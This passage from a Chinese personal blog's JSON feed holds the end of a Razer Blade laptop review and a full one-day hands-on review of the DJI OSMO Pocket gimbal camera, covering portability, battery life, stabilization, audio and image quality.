href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\" alt=\"\" width=\"1920\" height=\"954\" class=\"aligncenter size-full wp-image-1406\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-300x149.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-768x382.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-1024x509.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>平衡模式</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\" alt=\"\" width=\"1920\" height=\"957\" class=\"aligncenter size-full wp-image-1408\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-300x150.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-768x383.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-1024x510.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>高性能模式</span></p>\n<p>至于这 16GB 的内存…至少我是完全够用，要升级的话也可以自行更换到最高 64GB。</p>\n<h1>总结</h1>\n<p>这已经不是雷蛇第一年做笔记本了。总的来看，雷蛇似乎已经有些摸清了门道。今年年中推出的配备 9 代 Intel CPU 的灵刃系列几乎可以说是在各个方面都做到了尽可能完美。当然问题也有一些，相信雷蛇可以在后续解决。总结一下我手头的这台笔记本吧。</p>\n<p>优点：</p>\n<ul>\n<li>高性能的同时有较长续航</li>\n<li>优秀的屏幕</li>\n<li>干净的外观设计</li>\n<li>薄而坚固的机身</li>\n<li>较丰富的 IO</li>\n<li>细节到位（Wi-Fi 6、Windows Hello 等等）</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>价格稍高</li>\n<li>驱动、软件等有些不稳定</li>\n<li>为了散热有一定的性能损失</li>\n<li>机身偏重</li>\n</ul>\n<p>当我正准备结束这篇简评的时候正好收到了雷蛇雷云驱动更新，其中包含了我这一型号的「问题修复与改进」。待会儿就去更新，看看雷蛇有没有解决一部分问题吧。</p>\n<p>最后加一句，本文所有图片都是由一加 7 Pro 拍摄的，也就这样吧…</p>\n","link":"https://flyhigher.top/diary/1411.html"},{"title":"OSMO Pocket 一日试用报告","date":"2019-02-02 09:38:38","description":"\n<p>计划寒假出门练练延时视频的拍摄，碰巧得知老师买了一个 <a href=\"https://www.dji.com/osmo-pocket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OSMO Pocket</a>，正好我对这玩意儿有点兴趣，就向老师借了一天玩了玩，带着它在城市里跑了一圈，这篇文章算是试用后的总结报告。不过这毕竟只是一天快速试用之后的总结，如果有不正确或是不完善的地方还请见谅。</p>\n<p><strong>TL;DR:</strong> 这款产品目前应该只适用于重度 Vlog 拍摄者，相对其他拍摄方案有一些优势，但也有很多不足。对我来说，我本来没有太强烈的购买 OSMO Pocket 的欲望，试用过后依然没有太大的购买欲望。<strong>请谨慎考虑购买。</strong></p>\n<p>（如果出二代我可能会买吧…（小声）</p>\n<blockquote><p>这篇文章中所有图片和视频<strong>都经过二次压缩以缩短在网页上的加载时间，不代表 OSMO Pocket 的真实拍摄水平</strong>（当然所有评测都基于未压缩的原始图像），如果需要原始图像可以直接联系我。另外，本文中的多数照片/视频都是“为评测而拍”，没有刻意追求美感，虽然观感不一定好，但这不代表 OSMO Pocket 就拍不出好看的照片/视频——<strong>毕竟“人”才是一张照片是否“美”的决定因素。</strong></p></blockquote>\n<h1>初印象</h1>\n<p><strong>到手的第一印象：好小啊。</strong>虽然对 OSMO Pocket 已经提前有所了解，但刚刚接触它时仍惊讶于它的体积。就算有一层保护壳， OSMO Pocket 还是可以被轻松地放进口袋里，相对于手机+稳定器的方案，OSMO Pocket 便携多了，好评。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\" alt=\"\" width=\"1867\" height=\"2500\" class=\"aligncenter size-full wp-image-1313\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg 1867w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-224x300.jpg 224w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-768x1028.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-765x1024.jpg 765w\" sizes=\"(max-width: 1867px) 100vw, 1867px\"></a>\n<p><strong>完全启动的速度挺快</strong>，不过屏幕不大。屏幕支持触摸，而机身上的实体按键只有两个。简单试用了下，在屏幕上的操作主要以滑动为主，操作逻辑还算清晰，不过这个触屏对于点击的灵敏度真的挺低的，经常出现点击却没有反应的情况 。两个实体按键之一就是拍摄键，熟悉了之后操作效率还是很高的。好评。</p>\n<p>不过由于屏幕小，实际情况下很多操作无法在屏幕上完成，<strong>因此连接手机后的 OSMO Pocket 才算得上是完整体。</strong>其与手机的连接通过物理连接（连接头）实现（不过可以通过配件实现无线连接）。</p>\n<p>我拿到 OSMO Pocket 时它已经被使用了一段时间了，手机连接头已经插在机身上了。虽然这个连接头可以卸下并反装（以保护连接头）或者换上接口保护板，但是实际操作中要卸下连接头非常麻烦，所以一般情况下为了方便使用，连接头只能以这种有点难看的姿势插在机身上。DJI 甚至考虑到了这个问题，在保护壳的绑带上切了个口子，方便连接头伸出…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\" alt=\"\" width=\"2000\" height=\"2279\" class=\"aligncenter size-full wp-image-1314\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-263x300.jpg 263w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-768x875.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-899x1024.jpg 899w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>奇葩的保护壳</p>\n<p>机身底部是一个 USB Type-C 接口，用来充电，好评。不过没有标准螺口，没法直接固定在三脚架上，需要购买额外配件，很难受。</p>\n<p>此外使用时需要从机身侧面插入一张 SD 卡用于存储拍摄内容，通过配套的 DJI Mimo APP 可以将拍摄的内容传输到手机上。DJI Mimo 同时可以在 OSMO Pocket 连接到手机后作为拍摄控制器使用。</p>\n<p>第一眼看上去，OSMO Pocket 的镜头看起来跟普通手机的镜头差不多，不过具体表现还是要在试用后才能知道。</p>\n<h1>绝赞试用中</h1>\n<p>大概熟悉了一下操作，我第二天就带着 OSMO Pocket 出门了。<strong>最大的感受是太小巧了，至少比手机+稳定器的组合甚至是 GoPro+延长杆的组合要小很多</strong>，这带来了两方面的影响，一是我可以更快地进入拍摄状态，实测我从摸口袋到 OSMO Pocket 完成启动进入拍摄状态不超过 10 秒钟；二是小巧的机身也让 OSMO Pocket 在拍摄时显得更加低调，让我这种脸皮比较薄的人减少了很多心理压力。<strong>综合起来就是让我更愿意经常取出它来拍摄了。</strong></p>\n<h2>拍摄体验</h2>\n<p>我第一个使用的功能是延时视频，结果发现没有标准螺口带来的问题比我想象的还要严重。总之最后为了能顺利地拍完延时，我不得不用一种很难受的姿势把它摁在三脚架的云台上并这样保持十几分钟…然而就算是这样后来还是翻车了（</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\" alt=\"\" width=\"2428\" height=\"2500\" class=\"aligncenter size-full wp-image-1350\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg 2428w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-291x300.jpg 291w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-768x791.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-995x1024.jpg 995w\" sizes=\"(max-width: 2428px) 100vw, 2428px\"></a>\n<p>完全没法固定</p>\n<blockquote><p>买配件是不可能买配件的，这辈子都不可能买配件的，只能靠暴力摁住才勉强拍的了延时这个样子。</p></blockquote>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo3.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>摁得太用力了，三脚架云台没锁牢转偏了…</p>\n<p><strong>一个优点是拍摄延时视频时可以让云台按设定好的轨迹自动旋转。</strong>不过直接在内建屏幕上只能设定两个云台位置关键点，要连接手机才能比较方便地设定最多不超过四个关键点。延时视频的拍摄不支持防抖，任何轻微的抖动都会可能会导致成品在导出之后需要进行额外的防抖处理。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo2.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>直出延时，可以看到有轻微抖动</p>\n<p>为了方便调整云台位置我把手机插上了，然后发现这样的连接方式其实有点别扭。<strong>单手握持是不可能了：</strong>如果握着 OSMO Pocket，不仅整体重心会严重偏向手机，而且连接头大概不能长时间地支撑住悬空的手机；如果握住手机，OSMO Pocket 不算太轻的重量依然会让我担心连接头是否会损坏。算了，还是两个一起握着吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg\" alt=\"\" width=\"2300\" height=\"2244\" class=\"aligncenter size-full wp-image-1315\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/4.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-300x293.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-768x749.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/4-1024x999.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>连接手机示意图</p>\n<p>一度考虑过要不要暂时不带 OSMO Pocket 的保护壳了，毕竟保护壳还是有点占体积的，而且每次拍摄时将本体装入取出保护壳的动作也要花一点时间。<strong>但是后来发现保护壳其实必不可少。</strong>关机后云台会自动收缩到适合装入保护壳的状态，但由于云台的姿态锁定只会持续十几秒的时间，之后云台就会解锁以至于可以随外力转动，如果不及时放回保护壳内云台就有损坏的可能。</p>\n<p>拍着拍着，突然发现…诶我的电量呢？！<strong>OSMO Pocket 的掉电非常快</strong>，大概是太小的机身里塞不下太大电池的缘故，实际使用中大概1分钟就可以掉1%的电，如果打算重度使用，一个充电宝或是官方的充电盒是必不可少的了。</p>\n<p>接着试着拍了几段视频。防抖效果不用多说了，作为 OSMO Pocket 最大卖点之一，<strong>防抖效果的确非常优秀。</strong>云台有多种跟随方式，在屏幕上点几下就能切换，很方便。可以选定一块区域让云台跟随，大部分情况下不会跟丢（除非你跑偏得云台都到限位了…）。最高支持 4K/60fps 拍摄，同时有多种帧率可选，不过想要高码率模式还得使用 1080p 拍摄。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo4.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/4.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/5.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>没有特地压缓脚步，只剩下小幅上下移动了</p>\n<p><strong>视频的收音…很迷，不能算好，甚至只能算是“勉强能听”，听起来就感觉隔着层东西。</strong>作为一个主要面向 Vlogger 的产品我不清楚这样砍音质的目的是什么，不过好在 DJI 提供了音频转接头的附件，可以外接麦克风。（又要买附件！）</p>\n<p>除了拍摄视频和延时视频，OSMO Pocket 还有拍照、全景和慢动作三个模式。拍照基本就是按一下按钮的事，不过有 M 档，可以调整快门速度等，这意味着或许可以使用 OSMO Pocket 拍摄流光照片，不过我没来得及尝试。同时可以保存 DNG 格式的照片，好评；全景只有固定的 180° 视角（可以算是1×4）和 3×3 两种模式，而且无法直接在内建屏幕上查看已拍摄的全景照片，必须使用 APP 查看（似乎全景的拼接过程也是在手机上完成的）；慢动作基本是高帧率的 1080p 视频，会在机内完成放慢的处理。<strong>值得注意的是在慢动作模式下镜头视角会变小很多（官方数据为 34.9°）。</strong></p>\n<p>配套的 APP DJI Mimo 在拍摄方面还算好用（不过首页的类抖音风格我真的受不了…）。可设置项不算多，但布局还算清晰，不难上手，跟直接在内建屏幕上操作相比，APP 用起来还是很爽的。搭配 DJI 一贯的“一键制作视频”功能，拍摄剪辑分享可以说是一气呵成。当然如果有精细制作的需求还是导出来用专业软件剪比较好。<strong>不过通过 APP 只能查看机内 SD 卡中的“成品”，比如延时视频只能导出视频而不能导出每一帧的原始图像</strong>，官方称需要使用电脑才能导出其在拍摄延时视频中拍摄的 JPEG 原始图像，不过我没来得及用电脑连上看一看。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg\" alt=\"\" width=\"1920\" height=\"1080\" class=\"aligncenter size-full wp-image-1316\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/5.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-768x432.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/5-1024x576.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p>APP 的拍摄界面</p>\n<h2>拍摄质量</h2>\n<p>说一下“画质”。先看一下官方参数：1/2.3” CMOS，F/2，等效焦距 26mm。<strong>注意一下这个等效焦距并不广，尤其自拍的时候很容易出现“满屏幕都是脸”的情况。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg\" alt=\"\" width=\"540\" height=\"362\" class=\"aligncenter size-full wp-image-1320\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/9.jpg 540w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/9-300x201.jpg 300w\" sizes=\"(max-width: 540px) 100vw, 540px\"></a>\n<p>官网截图</p>\n<p>直接下结论：<strong>在我看来 OSMO Pocket 在照片/视频的拍摄质量方面与手机相比没有什么优势，甚至不如一些旗舰手机。</strong>照片比较平淡，曝光看看就好，画面放大看有比较严重的涂抹感，同时画面边缘有一些畸变。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg\" alt=\"\" width=\"2300\" height=\"1251\" class=\"aligncenter size-full wp-image-1336\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/8.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/8-1024x557.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>直出照片及其 EXIF 信息</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg\" alt=\"\" width=\"2500\" height=\"1360\" class=\"aligncenter size-full wp-image-1341\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-300x163.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-768x418.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/12-1024x557.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>当时没有拍对比照，另外用手机拍了一张大光比场景做个观感对比 (HDR+直出)</p>\n<p>夜景照片没来得及单独测试，不过从夜景延时视频的原始图像来看只能说一般般，噪点有些多，大光比场景看起来难以驾驭。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/11.jpg\" alt=\"\" width=\"2300\" height=\"1004\" class=\"aligncenter size-full wp-image-1340 srcset=\" https: sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>夜景延时视频其中一帧的原始图像</p>\n<p>视频也类似，看得出有涂抹感，而且在大光比下容易过曝/欠曝，不过码率挺高，看起来没怎么压缩。照片看起来有所压缩，而全景则被缩放得非常厉害，基本不能放大看，不知道这是不是因为通过 APP 导出的问题，希望可以在 SD 卡中找到未压缩的原始图像。<strong>总之不管这个镜头的素质如何，最后的产出和手机相比并没有什么优势。</strong>甚至在我手机有 Google 的 HDR+ 算法加持的情况下，OSMO Pocket 的照片从观感上来说可以算是被吊打。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg\" alt=\"\" width=\"2490\" height=\"631\" class=\"aligncenter size-full wp-image-1335\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/10.jpg 2490w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-300x76.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-768x195.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/10-1024x259.jpg 1024w\" sizes=\"(max-width: 2490px) 100vw, 2490px\"></a>\n<p>这张图直出尺寸只有 3984×1006</p>\n<h1>总结</h1>\n<p>OSMO Pocket 是一款优点和缺点都非常明显的产品，简单总结一下它的优缺点吧。</p>\n<p>优点：</p>\n<ul>\n<li>非常便携且启动快，可以快速进入拍摄状态</li>\n<li>优秀的防抖云台</li>\n<li>操作简单且效率高，容易上手</li>\n<li>功能还算丰富，可以满足一部分自定义的需求</li>\n<li>配合 APP 可以方便地进行拍摄分享</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>拍摄的质量与大部分手机相比没有优势</li>\n<li>贵，尤其是还有一大堆配件是需要额外购买的</li>\n<li>耗电快，续航时间比我想象的要短</li>\n<li>收音质量有待提高，镜头视角也“还不够广”</li>\n<li>部分功能感觉还有待完善</li>\n</ul>\n<p>总之，OSMO Pocket “在技术上”可以称得上是一款优秀的产品，这么小的体积却提供了优秀的防抖云台、完善的操作逻辑和不输手机的拍摄质量，很棒；<strong>但是在实用性上它的价值可能不是很高，较高的价格却无法提供相应的拍摄质量，而且对于大部分人来说，“快速进入拍摄”并不是一个痛点，这样的话，还是选择手机云台甚至相机云台吧。</strong></p>\n<p>顺便一提，由于 OSMO Pocket 在连接 Android 手机时会使用“USB 调试”功能，每当它连上我的手机时…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg\" alt=\"\" width=\"1080\" height=\"711\" class=\"aligncenter size-full wp-image-1318\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/6.jpg 1080w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-300x198.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-768x506.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/6-1024x674.jpg 1024w\" sizes=\"(max-width: 1080px) 100vw, 1080px\"></a>\n<p>黑阈：？？？</p>\n<p>(╯‵□′)╯︵┻━┻</p>\n","link":"https://flyhigher.top/photograph/1309.html"}]